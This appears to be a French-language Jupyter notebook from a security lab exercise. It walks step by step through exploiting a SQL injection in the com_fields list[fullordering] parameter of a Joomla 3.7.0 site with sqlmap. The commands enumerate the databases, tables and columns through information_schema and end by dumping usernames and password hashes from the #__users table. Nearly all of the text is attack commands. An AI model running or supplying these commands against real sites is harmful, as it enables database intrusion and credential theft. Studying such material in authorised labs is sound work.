```python
Tout d'abord sur la page d'acceuil, sans résultat
```

```python
os.system('sqlmap -u "http://joomla370/index.php"')
```

```python
Puis sur une url complete après un peu de recherche dans les liens fournit par le nmap
```

```python
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*"')
```

On trouve deux vulnérabilités
On remonte sur les bdd accessibles

```python
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --dbs')
```

Deux bases semblent accessibles, "information_schema" qui est une table contenant des informations génériques, et "ead_bd" qui semble est propre à notre application
On recherche les tables de la bdd "ead_db"

```python
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D ead_bd --tables')
```

De nombreuses table sont accessibles, avec une table "#__users" qui semble intéressante, on cherche donc les colonnes de cette tables

```python
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D ead_bd -T "#__users" --columns')
```

Sqlmap n'arrive pas a extraire directement le nom des colonne.
Nous allonstenter de les retrouvé via la bdd "information_schema"

```python
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D information_schema --tables')
```

```python
On recherche dans la tables COLUMNS (qui contient le nom de toutes les colonnes de toutes les BDD) le nom des colonne qui peuvent nous interesser
```

```python
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D information_schema -T COLUMNS --columns')
```

On selectionne TABLE_NAME & COLUMN_NAME afin de retrouver les noms de colonne de notre table "#__user"

```python
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D information_schema -T COLUMNS -C TABLE_NAME,COLUMN_NAME --dump')
```

On fait un grep sur le fichier de sortie pour récuperer les infirmation de notre table "#__users"

```python
os.system('cat /home/jovyan/.sqlmap/output/joomla370/dump/information_schema/COLUMNS.csv | grep "#__users"')
```

On relance l'attaque sur notre table "#__users" en précisant le nom des colonnes qui nous intéresse

```python
os.system('sqlmap -u "http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" -D ead_bd -T "#__users" -C username,password --dump')
```
